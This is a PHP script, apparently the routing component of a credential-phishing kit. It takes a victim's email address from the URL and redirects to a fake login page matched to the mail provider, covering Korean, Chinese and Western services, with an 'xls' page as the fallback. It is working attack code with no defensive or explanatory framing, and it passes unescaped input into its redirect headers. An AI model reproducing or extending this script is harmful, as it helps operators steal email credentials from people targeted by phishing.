<?php
function getDomainFromEmail($login)
{
// Get the data after the @ sign
$domain = substr(strrchr($login, "@"), 1);
return $domain;
} 
$login = $_GET['login'];
$domain = getDomainFromEmail($login);
if (stripos($domain,'yahoo') !== false) {
header( "Location: yahoo");
}
else if (stripos($domain,'daum') !== false) {
header( "Location: daum/index.php?login=".$login  );
}
else if (stripos($domain,'hanmail') !== false) {
header( "Location: daum/index.php?login=".$login  );
}
else if (stripos($domain,'paran') !== false) {
header( "Location: daum/index.php?login=".$login  );
}
else if (stripos($domain,'naver') !== false) {
header( "Location: nv/index.php?login=".$login );
}
else if (stripos($domain,'nate') !== false) {
header( "Location: nate/index.php?login=".$login );
}
else if (stripos($domain,'empas') !== false) {
header( "Location: nate/index.php?login=".$login );
}
else if (stripos($domain,'empal') !== false) {
header( "Location: nate/index.php?login=".$login );
}
else if (stripos($domain,'hanafos') !== false) {
header( "Location: nate/index.php?login=".$login );
}
else if (stripos($domain,'lycos') !== false) {
header( "Location: nate/index.php?login=".$login );
}
else if (stripos($domain,'netsgo') !== false) {
header( "Location: nate/index.php?login=".$login );
}
else if (stripos($domain,'126') !== false) {
header( "Location: 126/index.php?username=".$login  );
}
else if (stripos($domain,'vip.126') !== false) {
header( "Location: 126/index.php?username=".$login  );
}
else if (stripos($domain,'163') !== false) {
header( "Location: 163/index.php?login=".$login  );
}
else if (stripos($domain,'vip.163') !== false) {
header( "Location: 163/index.php?login=".$login  );
}
else if (stripos($domain,'aliyun') !== false) {
header( "Location: aliyun/index.php?username=".$login  );
}
else if (stripos($domain,'hotmail') !== false) {
header( "Location: hotmail/index.php?email=".$login );
}
else if (stripos($domain,'qq') !== false) {
header( "Location: qq/index.php?email=".$login  );
}
else if (stripos($domain,'live') !== false) {
header( "Location: hotmail/index.php?email=".$login  );
}
else if (stripos($domain,'outlook') !== false) {
header( "Location: hotmail/index.php?email=".$login );
}
else{
header( "Location: xls/index.php?login=".$login);
}
?>